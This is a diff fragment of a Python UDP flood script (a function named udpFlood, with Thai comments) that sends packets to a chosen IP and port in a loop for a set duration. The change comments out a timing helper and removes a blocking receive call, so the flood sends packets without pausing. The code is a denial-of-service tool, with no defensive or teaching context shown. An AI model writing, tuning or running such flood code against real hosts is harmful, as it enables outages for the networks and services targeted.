@@ -1,13 +1,13 @@
 import socket, random, sys, time
 
-def calculate_elapsed_time(duration):
-    start_time = time.time()
+# def calculate_elapsed_time(duration):
+#     start_time = time.time()
     
-    while time.time() - start_time < duration:
-        pass
+#     while time.time() - start_time < duration:
+#         pass
     
-    elapsed_time = time.time() - start_time
-    return elapsed_time
+#     elapsed_time = time.time() - start_time
+#     return elapsed_time
 
 def udpFlood():
     # สร้าง socket UDP
@@ -35,7 +35,6 @@ def udpFlood():
     # ส่งแพ็กเกต UDP ให้ตลอดเวลาจนกว่าจะสิ้นสุดตามเวลาที่กำหนด
     while time.time() - start_time < dur:
         s.sendto(payload, (dest_ip, dest_port))
-        data, address = s.recvfrom(1024)  # รับแพ็กเกตที่ส่งมา
         
         # ดำเนินการต่อกับแพ็กเกตที่ได้รับ
         
